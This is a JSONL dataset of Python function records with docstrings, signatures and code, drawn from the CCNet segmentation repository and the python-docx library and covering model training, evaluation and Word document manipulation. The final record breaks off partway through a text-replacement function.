{"docstring": "\"\"\"Create the model and start the training.\"\"\"\n", "func_signal": "def main():\n", "code": "writer = SummaryWriter(args.snapshot_dir)\n\nif not args.gpu == 'None':\n    os.environ[\"CUDA_VISIBLE_DEVICES\"]=args.gpu\nh, w = map(int, args.input_size.split(','))\ninput_size = (h, w)\n\ncudnn.enabled = True\n\n# Create network.\ndeeplab = Res_Deeplab(num_classes=args.num_classes)\nprint(deeplab)\n\nsaved_state_dict = torch.load(args.restore_from)\nnew_params = deeplab.state_dict().copy()\nfor i in saved_state_dict:\n    i_parts = i.split('.')\n    if not i_parts[0]=='fc':\n        new_params['.'.join(i_parts[0:])] = saved_state_dict[i] \n\ndeeplab.load_state_dict(new_params)\n\n\nmodel = DataParallelModel(deeplab)\nmodel.train()\nmodel.float()\n# model.apply(set_bn_momentum)\nmodel.cuda()    \n\nif args.ohem:\n    criterion = CriterionOhemDSN(thresh=args.ohem_thres, min_kept=args.ohem_keep)\nelse:\n    criterion = CriterionDSN() #CriterionCrossEntropy()\ncriterion = DataParallelCriterion(criterion)\ncriterion.cuda()\n\ncudnn.benchmark = True\n\nif not os.path.exists(args.snapshot_dir):\n    os.makedirs(args.snapshot_dir)\n\n\ntrainloader = data.DataLoader(CSDataSet(args.data_dir, args.data_list, max_iters=args.num_steps*args.batch_size, crop_size=input_size, \n                scale=args.random_scale, mirror=args.random_mirror, mean=IMG_MEAN), \n                batch_size=args.batch_size, shuffle=True, num_workers=4, pin_memory=True)\n\noptimizer = optim.SGD([{'params': filter(lambda p: p.requires_grad, deeplab.parameters()), 'lr': args.learning_rate }], \n            lr=args.learning_rate, momentum=args.momentum,weight_decay=args.weight_decay)\noptimizer.zero_grad()\n\nfor i_iter, batch in enumerate(trainloader):\n    i_iter += args.start_iters\n    images, labels, _, _ = batch\n    images = images.cuda()\n    labels = labels.long().cuda()\n    if torch_ver == \"0.3\":\n        images = Variable(images)\n        labels = Variable(labels)\n\n    optimizer.zero_grad()\n    lr = adjust_learning_rate(optimizer, i_iter)\n    preds = model(images, args.recurrence)\n\n    loss = criterion(preds, labels)\n    loss.backward()\n    optimizer.step()\n\n    if i_iter % 100 == 0:\n        writer.add_scalar('learning_rate', lr, i_iter)\n        writer.add_scalar('loss', loss.data.cpu().numpy(), i_iter)\n\n    # if i_iter % 5000 == 0:\n    #     images_inv = inv_preprocess(images, args.save_num_images, IMG_MEAN)\n    #     labels_colors = decode_labels(labels, args.save_num_images, args.num_classes)\n    #     if isinstance(preds, list):\n    #         preds = preds[0]\n    #     preds_colors = decode_predictions(preds, args.save_num_images, args.num_classes)\n    #     for index, (img, lab) in enumerate(zip(images_inv, labels_colors)):\n    #         writer.add_image('Images/'+str(index), img, i_iter)\n    #         writer.add_image('Labels/'+str(index), lab, i_iter)\n    #         writer.add_image('preds/'+str(index), preds_colors[index], i_iter)\n\n    print('iter = {} of {} completed, loss = {}'.format(i_iter, args.num_steps, loss.data.cpu().numpy()))\n\n    if i_iter >= args.num_steps-1:\n        print('save model ...')\n        torch.save(deeplab.state_dict(),osp.join(args.snapshot_dir, 'CS_scenes_'+str(args.num_steps)+'.pth'))\n        break\n\n    if i_iter % args.save_pred_every == 0:\n        print('taking snapshot ...')\n        torch.save(deeplab.state_dict(),osp.join(args.snapshot_dir, 'CS_scenes_'+str(i_iter)+'.pth'))     \n\nend = timeit.default_timer()\nprint(end-start,'seconds')", "path": "CCNet/train.py", "commit_date": "2018-12-11 00:00:00", "repo_name": "speedinghzl/CCNet", "stars": 1382, "license": "mit", "language": "python", "size": 4069}
{"docstring": "\"\"\" Returns the color map for visualizing the segmentation mask.\nArgs:\n    num_cls: Number of classes\nReturns:\n    The color map\n\"\"\"\n\n", "func_signal": "def get_palette(num_cls):\n", "code": "n = num_cls\npalette = [0] * (n * 3)\nfor j in range(0, n):\n    lab = j\n    palette[j * 3 + 0] = 0\n    palette[j * 3 + 1] = 0\n    palette[j * 3 + 2] = 0\n    i = 0\n    while lab:\n        palette[j * 3 + 0] |= (((lab >> 0) & 1) << (7 - i))\n        palette[j * 3 + 1] |= (((lab >> 1) & 1) << (7 - i))\n        palette[j * 3 + 2] |= (((lab >> 2) & 1) << (7 - i))\n        i += 1\n        lab >>= 3\nreturn palette", "path": "CCNet/evaluate.py", "commit_date": "2018-12-11 00:00:00", "repo_name": "speedinghzl/CCNet", "stars": 1382, "license": "mit", "language": "python", "size": 4069}
{"docstring": "\"\"\"\n    Args:\n        predict:(n, c, h, w)\n        target:(n, h, w)\n        weight (Tensor, optional): a manual rescaling weight given to each class.\n                                   If given, has to be a Tensor of size \"nclasses\"\n\"\"\"\n", "func_signal": "def forward(self, predict, target, weight=None):\n", "code": "assert not target.requires_grad\n\ninput_prob = F.softmax(predict, 1)\ntarget = self.generate_new_target(input_prob, target)\nreturn self.criterion(predict, target)", "path": "CCNet/utils/loss.py", "commit_date": "2018-11-29 00:00:00", "repo_name": "speedinghzl/CCNet", "stars": 1382, "license": "mit", "language": "python", "size": 4069}
{"docstring": "\"\"\"\nPredict an image by looking at it with different scales.\n    We choose the \"predict_whole_img\" for the image with less than the original input size,\n    for the input of larger size, we would choose the cropping method to ensure that GPU memory is enough.\n\"\"\"\n", "func_signal": "def predict_multiscale(net, image, tile_size, scales, classes, flip_evaluation, recurrence):\n", "code": "image = image.data\nN_, C_, H_, W_ = image.shape\nfull_probs = np.zeros((H_, W_, classes))  \nfor scale in scales:\n    scale = float(scale)\n    print(\"Predicting image scaled by %f\" % scale)\n    scale_image = ndimage.zoom(image, (1.0, 1.0, scale, scale), order=1, prefilter=False)\n    scaled_probs = predict_whole(net, scale_image, tile_size, recurrence)\n    if flip_evaluation == True:\n        flip_scaled_probs = predict_whole(net, scale_image[:,:,:,::-1].copy(), tile_size, recurrence)\n        scaled_probs = 0.5 * (scaled_probs + flip_scaled_probs[:,::-1,:])\n    full_probs += scaled_probs\nfull_probs /= len(scales)\nreturn full_probs", "path": "CCNet/evaluate.py", "commit_date": "2018-12-11 00:00:00", "repo_name": "speedinghzl/CCNet", "stars": 1382, "license": "mit", "language": "python", "size": 4069}
{"docstring": "\"\"\"Decode batch of segmentation masks.\n\nArgs:\n  mask: result of inference after taking argmax.\n  num_images: number of images to decode from the batch.\n  num_classes: number of classes to predict (including background).\n\nReturns:\n  A batch with num_images RGB images of the same size as the input. \n\"\"\"\n", "func_signal": "def decode_labels(mask, num_images=1, num_classes=21):\n", "code": "mask = mask.data.cpu().numpy()\nn, h, w = mask.shape\nassert(n >= num_images), 'Batch size %d should be greater or equal than number of images to save %d.' % (n, num_images)\noutputs = np.zeros((num_images, h, w, 3), dtype=np.uint8)\nfor i in range(num_images):\n  img = Image.new('RGB', (len(mask[i, 0]), len(mask[i])))\n  pixels = img.load()\n  for j_, j in enumerate(mask[i, :, :]):\n      for k_, k in enumerate(j):\n          if k < num_classes:\n              pixels[k_,j_] = label_colours[k]\n  outputs[i] = np.array(img)\nreturn outputs", "path": "CCNet/utils/utils.py", "commit_date": "2018-11-29 00:00:00", "repo_name": "speedinghzl/CCNet", "stars": 1382, "license": "mit", "language": "python", "size": 4069}
{"docstring": "\"\"\"\nExecute an replication callback `__data_parallel_replicate__` on each module created\nby original replication.\n\nThe callback will be invoked with arguments `__data_parallel_replicate__(ctx, copy_id)`\n\nNote that, as all modules are isomorphism, we assign each sub-module with a context\n(shared among multiple copies of this module on different devices).\nThrough this context, different copies can share some information.\n\nWe guarantee that the callback on the master copy (the first copy) will be called ahead\nof calling the callback of any slave copies.\n\"\"\"\n", "func_signal": "def execute_replication_callbacks(modules):\n", "code": "master_copy = modules[0]\nnr_modules = len(list(master_copy.modules()))\nctxs = [CallbackContext() for _ in range(nr_modules)]\n\nfor i, module in enumerate(modules):\n    for j, m in enumerate(module.modules()):\n        if hasattr(m, '__data_parallel_replicate__'):\n            m.__data_parallel_replicate__(ctxs[j], i)", "path": "CCNet/utils/encoding.py", "commit_date": "2018-11-29 00:00:00", "repo_name": "speedinghzl/CCNet", "stars": 1382, "license": "mit", "language": "python", "size": 4069}
{"docstring": "\"\"\"Parse all the arguments provided from the CLI.\n\nReturns:\n  A list of parsed arguments.\n\"\"\"\n", "func_signal": "def get_arguments():\n", "code": "parser = argparse.ArgumentParser(description=\"DeepLabLFOV Network\")\nparser.add_argument(\"--data-dir\", type=str, default=DATA_DIRECTORY,\n                    help=\"Path to the directory containing the PASCAL VOC dataset.\")\nparser.add_argument(\"--data-list\", type=str, default=DATA_LIST_PATH,\n                    help=\"Path to the file listing the images in the dataset.\")\nparser.add_argument(\"--ignore-label\", type=int, default=IGNORE_LABEL,\n                    help=\"The index of the label to ignore during the training.\")\nparser.add_argument(\"--num-classes\", type=int, default=NUM_CLASSES,\n                    help=\"Number of classes to predict (including background).\")\nparser.add_argument(\"--restore-from\", type=str, default=RESTORE_FROM,\n                    help=\"Where restore model parameters from.\")\nparser.add_argument(\"--gpu\", type=str, default='0',\n                    help=\"choose gpu device.\")\nparser.add_argument(\"--recurrence\", type=int, default=1,\n                    help=\"choose the number of recurrence.\")\nparser.add_argument(\"--input-size\", type=str, default=INPUT_SIZE,\n                    help=\"Comma-separated string with height and width of images.\")\nparser.add_argument(\"--whole\", type=bool, default=False,\n                    help=\"use whole input size.\")\nreturn parser.parse_args()", "path": "CCNet/evaluate.py", "commit_date": "2018-12-11 00:00:00", "repo_name": "speedinghzl/CCNet", "stars": 1382, "license": "mit", "language": "python", "size": 4069}
{"docstring": "\"\"\"\nMonkey-patch an existing `DataParallel` object. Add the replication callback.\nUseful when you have customized `DataParallel` implementation.\n\nExamples:\n    > sync_bn = SynchronizedBatchNorm1d(10, eps=1e-5, affine=False)\n    > sync_bn = DataParallel(sync_bn, device_ids=[0, 1])\n    > patch_replication_callback(sync_bn)\n    # this is equivalent to\n    > sync_bn = SynchronizedBatchNorm1d(10, eps=1e-5, affine=False)\n    > sync_bn = DataParallelWithCallback(sync_bn, device_ids=[0, 1])\n\"\"\"\n\n", "func_signal": "def patch_replication_callback(data_parallel):\n", "code": "assert isinstance(data_parallel, DataParallel)\n\nold_replicate = data_parallel.replicate\n\n@functools.wraps(old_replicate)\ndef new_replicate(module, device_ids):\n    modules = old_replicate(module, device_ids)\n    execute_replication_callbacks(modules)\n    return modules\n\ndata_parallel.replicate = new_replicate", "path": "CCNet/utils/encoding.py", "commit_date": "2018-11-29 00:00:00", "repo_name": "speedinghzl/CCNet", "stars": 1382, "license": "mit", "language": "python", "size": 4069}
{"docstring": "\"\"\"Parse all the arguments provided from the CLI.\n\nReturns:\n  A list of parsed arguments.\n\"\"\"\n", "func_signal": "def get_arguments():\n", "code": "parser = argparse.ArgumentParser(description=\"DeepLab-ResNet Network\")\nparser.add_argument(\"--batch-size\", type=int, default=BATCH_SIZE,\n                    help=\"Number of images sent to the network in one step.\")\nparser.add_argument(\"--data-dir\", type=str, default=DATA_DIRECTORY,\n                    help=\"Path to the directory containing the PASCAL VOC dataset.\")\nparser.add_argument(\"--data-list\", type=str, default=DATA_LIST_PATH,\n                    help=\"Path to the file listing the images in the dataset.\")\nparser.add_argument(\"--ignore-label\", type=int, default=IGNORE_LABEL,\n                    help=\"The index of the label to ignore during the training.\")\nparser.add_argument(\"--input-size\", type=str, default=INPUT_SIZE,\n                    help=\"Comma-separated string with height and width of images.\")\nparser.add_argument(\"--is-training\", action=\"store_true\",\n                    help=\"Whether to updates the running means and variances during the training.\")\nparser.add_argument(\"--learning-rate\", type=float, default=LEARNING_RATE,\n                    help=\"Base learning rate for training with polynomial decay.\")\nparser.add_argument(\"--momentum\", type=float, default=MOMENTUM,\n                    help=\"Momentum component of the optimiser.\")\nparser.add_argument(\"--not-restore-last\", action=\"store_true\",\n                    help=\"Whether to not restore last (FC) layers.\")\nparser.add_argument(\"--num-classes\", type=int, default=NUM_CLASSES,\n                    help=\"Number of classes to predict (including background).\")\nparser.add_argument(\"--start-iters\", type=int, default=0,\n                    help=\"Number of classes to predict (including background).\")\nparser.add_argument(\"--num-steps\", type=int, default=NUM_STEPS,\n                    help=\"Number of training steps.\")\nparser.add_argument(\"--power\", type=float, default=POWER,\n                    help=\"Decay parameter to compute the learning rate.\")\nparser.add_argument(\"--random-mirror\", action=\"store_true\",\n                    help=\"Whether to randomly mirror the inputs during the training.\")\nparser.add_argument(\"--random-scale\", action=\"store_true\",\n                    help=\"Whether to randomly scale the inputs during the training.\")\nparser.add_argument(\"--random-seed\", type=int, default=RANDOM_SEED,\n                    help=\"Random seed to have reproducible results.\")\nparser.add_argument(\"--restore-from\", type=str, default=RESTORE_FROM,\n                    help=\"Where restore model parameters from.\")\nparser.add_argument(\"--save-num-images\", type=int, default=SAVE_NUM_IMAGES,\n                    help=\"How many images to save.\")\nparser.add_argument(\"--save-pred-every\", type=int, default=SAVE_PRED_EVERY,\n                    help=\"Save summaries and checkpoint every often.\")\nparser.add_argument(\"--snapshot-dir\", type=str, default=SNAPSHOT_DIR,\n                    help=\"Where to save snapshots of the model.\")\nparser.add_argument(\"--weight-decay\", type=float, default=WEIGHT_DECAY,\n                    help=\"Regularisation parameter for L2-loss.\")\nparser.add_argument(\"--gpu\", type=str, default='None',\n                    help=\"choose gpu device.\")\nparser.add_argument(\"--recurrence\", type=int, default=1,\n                    help=\"choose the number of recurrence.\")\nparser.add_argument(\"--ft\", type=bool, default=False,\n                    help=\"fine-tune the model with large input size.\")\n\nparser.add_argument(\"--ohem\", type=str2bool, default='False',\n                    help=\"use hard negative mining\")\nparser.add_argument(\"--ohem-thres\", type=float, default=0.6,\n                    help=\"choose the samples with correct probability underthe threshold.\")\nparser.add_argument(\"--ohem-keep\", type=int, default=200000,\n                    help=\"choose the samples with correct probability underthe threshold.\")\nreturn parser.parse_args()", "path": "CCNet/train.py", "commit_date": "2018-12-11 00:00:00", "repo_name": "speedinghzl/CCNet", "stars": 1382, "license": "mit", "language": "python", "size": 4069}
{"docstring": "\"\"\"Sets the learning rate to the initial LR divided by 5 at 60th, 120th and 160th epochs\"\"\"\n", "func_signal": "def adjust_learning_rate(optimizer, i_iter):\n", "code": "lr = lr_poly(args.learning_rate, i_iter, args.num_steps, args.power)\noptimizer.param_groups[0]['lr'] = lr\nreturn lr", "path": "CCNet/train.py", "commit_date": "2018-12-11 00:00:00", "repo_name": "speedinghzl/CCNet", "stars": 1382, "license": "mit", "language": "python", "size": 4069}
{"docstring": "# input should be already scatterd\n# scattering the targets instead\n", "func_signal": "def forward(self, inputs, *targets, **kwargs):\n", "code": "if not self.device_ids:\n    return self.module(inputs, *targets, **kwargs)\ntargets, kwargs = self.scatter(targets, kwargs, self.device_ids)\nif len(self.device_ids) == 1:\n    return self.module(inputs, *targets[0], **kwargs[0])\nreplicas = self.replicate(self.module, self.device_ids[:len(inputs)])\noutputs = _criterion_parallel_apply(replicas, inputs, targets, kwargs)\nreturn Reduce.apply(*outputs) / len(outputs)\n#return self.gather(outputs, self.output_device).mean()", "path": "CCNet/utils/encoding.py", "commit_date": "2018-11-29 00:00:00", "repo_name": "speedinghzl/CCNet", "stars": 1382, "license": "mit", "language": "python", "size": 4069}
{"docstring": "\"\"\"Pad an image up to the target size.\"\"\"\n", "func_signal": "def pad_image(img, target_size):\n", "code": "rows_missing = target_size[0] - img.shape[2]\ncols_missing = target_size[1] - img.shape[3]\npadded_img = np.pad(img, ((0, 0), (0, 0), (0, rows_missing), (0, cols_missing)), 'constant')\nreturn padded_img", "path": "CCNet/evaluate.py", "commit_date": "2018-12-11 00:00:00", "repo_name": "speedinghzl/CCNet", "stars": 1382, "license": "mit", "language": "python", "size": 4069}
{"docstring": "\"\"\"Pad an image up to the target size.\"\"\"\n", "func_signal": "def pad_image(img, target_size):\n", "code": "rows_missing = target_size[0] - img.shape[2]\ncols_missing = target_size[1] - img.shape[3]\npadded_img = np.pad(img, ((0, 0), (0, 0), (0, rows_missing), (0, cols_missing)), 'constant')\nreturn padded_img", "path": "CCNet/test.py", "commit_date": "2018-12-11 00:00:00", "repo_name": "speedinghzl/CCNet", "stars": 1382, "license": "mit", "language": "python", "size": 4069}
{"docstring": "\"\"\" Returns the color map for visualizing the segmentation mask.\nArgs:\n    num_cls: Number of classes\nReturns:\n    The color map\n\"\"\"\n\n", "func_signal": "def get_palette(num_cls):\n", "code": "n = num_cls\npalette = [0] * (n * 3)\nfor j in range(0, n):\n    lab = j\n    palette[j * 3 + 0] = 0\n    palette[j * 3 + 1] = 0\n    palette[j * 3 + 2] = 0\n    i = 0\n    while lab:\n        palette[j * 3 + 0] |= (((lab >> 0) & 1) << (7 - i))\n        palette[j * 3 + 1] |= (((lab >> 1) & 1) << (7 - i))\n        palette[j * 3 + 2] |= (((lab >> 2) & 1) << (7 - i))\n        i += 1\n        lab >>= 3\nreturn palette", "path": "CCNet/test.py", "commit_date": "2018-12-11 00:00:00", "repo_name": "speedinghzl/CCNet", "stars": 1382, "license": "mit", "language": "python", "size": 4069}
{"docstring": "\"\"\"Decode batch of segmentation masks.\n\nArgs:\n  mask: result of inference after taking argmax.\n  num_images: number of images to decode from the batch.\n  num_classes: number of classes to predict (including background).\n\nReturns:\n  A batch with num_images RGB images of the same size as the input. \n\"\"\"\n", "func_signal": "def decode_predictions(preds, num_images=1, num_classes=21):\n", "code": "if isinstance(preds, list):\n    preds_list = []\n    for pred in preds:\n        preds_list.append(pred[-1].data.cpu().numpy())\n    preds = np.concatenate(preds_list, axis=0)\nelse:\n    preds = preds.data.cpu().numpy()\n\npreds = np.argmax(preds, axis=1)\nn, h, w = preds.shape\nassert(n >= num_images), 'Batch size %d should be greater or equal than number of images to save %d.' % (n, num_images)\noutputs = np.zeros((num_images, h, w, 3), dtype=np.uint8)\nfor i in range(num_images):\n  img = Image.new('RGB', (len(preds[i, 0]), len(preds[i])))\n  pixels = img.load()\n  for j_, j in enumerate(preds[i, :, :]):\n      for k_, k in enumerate(j):\n          if k < num_classes:\n              pixels[k_,j_] = label_colours[k]\n  outputs[i] = np.array(img)\nreturn outputs", "path": "CCNet/utils/utils.py", "commit_date": "2018-11-29 00:00:00", "repo_name": "speedinghzl/CCNet", "stars": 1382, "license": "mit", "language": "python", "size": 4069}
{"docstring": "\"\"\"Create the model and start the evaluation process.\"\"\"\n", "func_signal": "def main():\n", "code": "args = get_arguments()\n\n# gpu0 = args.gpu\nos.environ[\"CUDA_VISIBLE_DEVICES\"]=args.gpu\nh, w = map(int, args.input_size.split(','))\nif args.whole:\n    input_size = (1024, 2048)\nelse:\n    input_size = (h, w)\n\nmodel = Res_Deeplab(num_classes=args.num_classes)\n\nsaved_state_dict = torch.load(args.restore_from)\nmodel.load_state_dict(saved_state_dict)\n\nmodel.eval()\nmodel.cuda()\n\ntestloader = data.DataLoader(CSDataSet(args.data_dir, args.data_list, crop_size=(1024, 2048), mean=IMG_MEAN, scale=False, mirror=False), \n                                batch_size=1, shuffle=False, pin_memory=True)\n\ndata_list = []\nconfusion_matrix = np.zeros((args.num_classes,args.num_classes))\npalette = get_palette(256)\ninterp = nn.Upsample(size=(1024, 2048), mode='bilinear', align_corners=True)\n\nif not os.path.exists('outputs'):\n    os.makedirs('outputs')\n\nfor index, batch in enumerate(testloader):\n    if index % 100 == 0:\n        print('%d processd'%(index))\n    image, label, size, name = batch\n    size = size[0].numpy()\n    with torch.no_grad():\n        if args.whole:\n            output = predict_multiscale(model, image, input_size, [0.75, 1.0, 1.25], args.num_classes, True, args.recurrence)\n        else:\n            output = predict_sliding(model, image.numpy(), input_size, args.num_classes, True, args.recurrence)\n    # padded_prediction = model(Variable(image, volatile=True).cuda())\n    # output = interp(padded_prediction).cpu().data[0].numpy().transpose(1,2,0)\n    seg_pred = np.asarray(np.argmax(output, axis=2), dtype=np.uint8)\n    output_im = PILImage.fromarray(seg_pred)\n    output_im.putpalette(palette)\n    output_im.save('outputs/'+name[0]+'.png')\n\n    seg_gt = np.asarray(label[0].numpy()[:size[0],:size[1]], dtype=np.int)\n\n    ignore_index = seg_gt != 255\n    seg_gt = seg_gt[ignore_index]\n    seg_pred = seg_pred[ignore_index]\n    # show_all(gt, output)\n    confusion_matrix += get_confusion_matrix(seg_gt, seg_pred, args.num_classes)\n\npos = confusion_matrix.sum(1)\nres = confusion_matrix.sum(0)\ntp = np.diag(confusion_matrix)\n\nIU_array = (tp / np.maximum(1.0, pos + res - tp))\nmean_IU = IU_array.mean()\n\n# getConfusionMatrixPlot(confusion_matrix)\nprint({'meanIU':mean_IU, 'IU_array':IU_array})\nwith open('result.txt', 'w') as f:\n    f.write(json.dumps({'meanIU':mean_IU, 'IU_array':IU_array.tolist()}))", "path": "CCNet/evaluate.py", "commit_date": "2018-12-11 00:00:00", "repo_name": "speedinghzl/CCNet", "stars": 1382, "license": "mit", "language": "python", "size": 4069}
{"docstring": "\"\"\"Parse all the arguments provided from the CLI.\n\nReturns:\n  A list of parsed arguments.\n\"\"\"\n", "func_signal": "def get_arguments():\n", "code": "parser = argparse.ArgumentParser(description=\"DeepLabLFOV Network\")\nparser.add_argument(\"--data-dir\", type=str, default=DATA_DIRECTORY,\n                    help=\"Path to the directory containing the PASCAL VOC dataset.\")\nparser.add_argument(\"--data-list\", type=str, default=DATA_LIST_PATH,\n                    help=\"Path to the file listing the images in the dataset.\")\nparser.add_argument(\"--ignore-label\", type=int, default=IGNORE_LABEL,\n                    help=\"The index of the label to ignore during the training.\")\nparser.add_argument(\"--num-classes\", type=int, default=NUM_CLASSES,\n                    help=\"Number of classes to predict (including background).\")\nparser.add_argument(\"--restore-from\", type=str, default=RESTORE_FROM,\n                    help=\"Where restore model parameters from.\")\nparser.add_argument(\"--gpu\", type=str, default='0',\n                    help=\"choose gpu device.\")\nparser.add_argument(\"--recurrence\", type=int, default=1,\n                    help=\"choose the number of recurrence.\")\nparser.add_argument(\"--input-size\", type=str, default=INPUT_SIZE,\n                    help=\"Comma-separated string with height and width of images.\")\nparser.add_argument(\"--whole\", type=bool, default=False,\n                    help=\"use whole input size.\")\nreturn parser.parse_args()", "path": "CCNet/test.py", "commit_date": "2018-12-11 00:00:00", "repo_name": "speedinghzl/CCNet", "stars": 1382, "license": "mit", "language": "python", "size": 4069}
{"docstring": "'''Insert a break, default 'page'.\nSee http://openxmldeveloper.org/forums/thread/4075.aspx\nReturn our page break element.'''\n# Need to enumerate different types of page breaks.\n", "func_signal": "def pagebreak(type='page', orient='portrait'):\n", "code": "validtypes = ['page', 'section']\nif type not in validtypes:\n    tmpl = 'Page break style \"%s\" not implemented. Valid styles: %s.'\n    raise ValueError(tmpl % (type, validtypes))\npagebreak = makeelement('p')\nif type == 'page':\n    run = makeelement('r')\n    br = makeelement('br', attributes={'type': type})\n    run.append(br)\n    pagebreak.append(run)\nelif type == 'section':\n    pPr = makeelement('pPr')\n    sectPr = makeelement('sectPr')\n    if orient == 'portrait':\n        pgSz = makeelement('pgSz', attributes={'w': '12240', 'h': '15840'})\n    elif orient == 'landscape':\n        pgSz = makeelement('pgSz', attributes={'h': '12240', 'w': '15840',\n                                               'orient': 'landscape'})\n    sectPr.append(pgSz)\n    pPr.append(sectPr)\n    pagebreak.append(pPr)\nreturn pagebreak", "path": "python-docx/docx.py", "commit_date": "2014-02-06 00:00:00", "repo_name": "mikemaccana/python-docx", "stars": 1066, "license": "mit", "language": "python", "size": 861}
{"docstring": "\"\"\"Make a docx (document, relationships) for use in other docx tests\"\"\"\n", "func_signal": "def simpledoc(noimagecopy=False):\n", "code": "relationships = relationshiplist()\nimagefiledict = {}\ndocument = newdocument()\ndocbody = document.xpath('/w:document/w:body', namespaces=nsprefixes)[0]\ndocbody.append(heading('Heading 1', 1))\ndocbody.append(heading('Heading 2', 2))\ndocbody.append(paragraph('Paragraph 1'))\nfor point in ['List Item 1', 'List Item 2', 'List Item 3']:\n    docbody.append(paragraph(point, style='ListNumber'))\ndocbody.append(pagebreak(type='page'))\ndocbody.append(paragraph('Paragraph 2'))\ndocbody.append(\n    table(\n        [\n            ['A1', 'A2', 'A3'],\n            ['B1', 'B2', 'B3'],\n            ['C1', 'C2', 'C3']\n        ]\n    )\n)\ndocbody.append(pagebreak(type='section', orient='portrait'))\nif noimagecopy:\n    relationships, picpara, imagefiledict = picture(\n        relationships, IMAGE1_FILE, 'This is a test description',\n        imagefiledict=imagefiledict\n    )\nelse:\n    relationships, picpara = picture(\n        relationships, IMAGE1_FILE, 'This is a test description'\n    )\ndocbody.append(picpara)\ndocbody.append(pagebreak(type='section', orient='landscape'))\ndocbody.append(paragraph('Paragraph 3'))\nif noimagecopy:\n    return (document, docbody, relationships, imagefiledict)\nelse:\n    return (document, docbody, relationships)", "path": "python-docx/tests/test_docx.py", "commit_date": "2014-02-06 00:00:00", "repo_name": "mikemaccana/python-docx", "stars": 1066, "license": "mit", "language": "python", "size": 861}
{"docstring": "\"\"\"Ensure paragraph creates p elements\"\"\"\n", "func_signal": "def testparagraph():\n", "code": "testpara = paragraph('paratext', style='BodyText')\nassert testpara.tag == (\n    '{http://schemas.openxmlformats.org/wordprocessingml/2006/main}p'\n)\npass", "path": "python-docx/tests/test_docx.py", "commit_date": "2014-02-06 00:00:00", "repo_name": "mikemaccana/python-docx", "stars": 1066, "license": "mit", "language": "python", "size": 861}
{"docstring": "\"\"\" Finds fist parent of element of the given type\n\n@param object element: etree element\n@param string the tag parent to search for\n\n@return object element: the found parent or None when not found\n\"\"\"\n\n", "func_signal": "def findTypeParent(element, tag):\n", "code": "p = element\nwhile True:\n    p = p.getparent()\n    if p.tag == tag:\n        return p\n\n# Not found\nreturn None", "path": "python-docx/docx.py", "commit_date": "2014-02-06 00:00:00", "repo_name": "mikemaccana/python-docx", "stars": 1066, "license": "mit", "language": "python", "size": 861}
{"docstring": "'''Generate websettings'''\n", "func_signal": "def websettings():\n", "code": "web = makeelement('webSettings')\nweb.append(makeelement('allowPNG'))\nweb.append(makeelement('doNotSaveAsSingleFile'))\nreturn web", "path": "python-docx/docx.py", "commit_date": "2014-02-06 00:00:00", "repo_name": "mikemaccana/python-docx", "stars": 1066, "license": "mit", "language": "python", "size": 861}
{"docstring": "\"\"\"\nReplace all occurences of string with a different string, return updated\ndocument\n\"\"\"\n", "func_signal": "def replace(document, search, replace):\n", "code": "newdocument = document\nsearchre = re.compile(search)\nfor element in newdocument.iter():\n    if element.tag == '{%s}t' % nsprefixes['w']:  # t (text) elements\n        if element.text:\n            if searchre.search(element.text):\n                element.text = re.sub(search, replace, element.text)\nreturn newdocument", "path": "python-docx/docx.py", "commit_date": "2014-02-06 00:00:00", "repo_name": "mikemaccana/python-docx", "stars": 1066, "license": "mit", "language": "python", "size": 861}
{"docstring": "\"\"\"Ensure unsupported page break types are trapped\"\"\"\n", "func_signal": "def testunsupportedpagebreak():\n", "code": "document = newdocument()\ndocbody = document.xpath('/w:document/w:body', namespaces=nsprefixes)[0]\ntry:\n    docbody.append(pagebreak(type='unsup'))\nexcept ValueError:\n    return  # passed\nassert False  # failed", "path": "python-docx/tests/test_docx.py", "commit_date": "2014-02-06 00:00:00", "repo_name": "mikemaccana/python-docx", "stars": 1066, "license": "mit", "language": "python", "size": 861}
{"docstring": "\"\"\"\nReplace all occurences of string with a different string, return updated\ndocument\n\nThis is a modified version of python-docx.replace() that takes into\naccount blocks of <bs> elements at a time. The replace element can also\nbe a string or an xml etree element.\n\nWhat it does:\nIt searches the entire document body for text blocks.\nThen scan thos text blocks for replace.\nSince the text to search could be spawned across multiple text blocks,\nwe need to adopt some sort of algorithm to handle this situation.\nThe smaller matching group of blocks (up to bs) is then adopted.\nIf the matching group has more than one block, blocks other than first\nare cleared and all the replacement text is put on first block.\n\nExamples:\noriginal text blocks : [ 'Hel', 'lo,', ' world!' ]\nsearch / replace: 'Hello,' / 'Hi!'\noutput blocks : [ 'Hi!', '', ' world!' ]\n\noriginal text blocks : [ 'Hel', 'lo,', ' world!' ]\nsearch / replace: 'Hello, world' / 'Hi!'\noutput blocks : [ 'Hi!!', '', '' ]\n\noriginal text blocks : [ 'Hel', 'lo,', ' world!' ]\nsearch / replace: 'Hel' / 'Hal'\noutput blocks : [ 'Hal', 'lo,', ' world!' ]\n\n@param instance  document: The original document\n@param str       search: The text to search for (regexp)\n@param mixed     replace: The replacement text or lxml.etree element to\n                     append, or a list of etree elements\n@param int       bs: See above\n\n@return instance The document with replacement applied\n\n\"\"\"\n# Enables debug output\n", "func_signal": "def advReplace(document, search, replace, bs=3):\n", "code": "DEBUG = False\n\nnewdocument = document\n\n# Compile the search regexp\nsearchre = re.compile(search)\n\n# Will match against searchels. Searchels is a list that contains last\n# n text elements found in the document. 1 < n < bs\nsearchels = []\n\nfor element in newdocument.iter():\n    if element.tag == '{%s}t' % nsprefixes['w']:  # t (text) elements\n        if element.text:\n            # Add this element to searchels\n            searchels.append(element)\n            if len(searchels) > bs:\n                # Is searchels is too long, remove first elements\n                searchels.pop(0)\n\n            # Search all combinations, of searchels, starting from\n            # smaller up to bigger ones\n            # l = search lenght\n            # s = search start\n            # e = element IDs to merge\n            found = False\n            for l in range(1, len(searchels)+1):\n                if found:\n                    break\n                #print \"slen:\", l\n                for s in range(len(searchels)):\n                    if found:\n                        break\n                    if s+l <= len(searchels):\n                        e = range(s, s+l)\n                        #print \"elems:\", e\n                        txtsearch = ''\n                        for k in e:\n                            txtsearch += searchels[k].text\n\n                        # Searcs for the text in the whole txtsearch\n                        match = searchre.search(txtsearch)\n                        if match:\n                            found = True\n\n                            # I've found something :)\n                            if DEBUG:\n                                log.debug(\"Found element!\")\n                                log.debug(\"Search regexp: %s\",\n                                          searchre.pattern)\n                                log.debug(\"Requested replacement: %s\",\n                                          replace)\n                                log.debug(\"Matched text: %s\", txtsearch)\n                                log.debug(\"Matched text (splitted): %s\",\n                                          map(lambda i: i.text, searchels))\n                                log.debug(\"Matched at position: %s\",\n                                 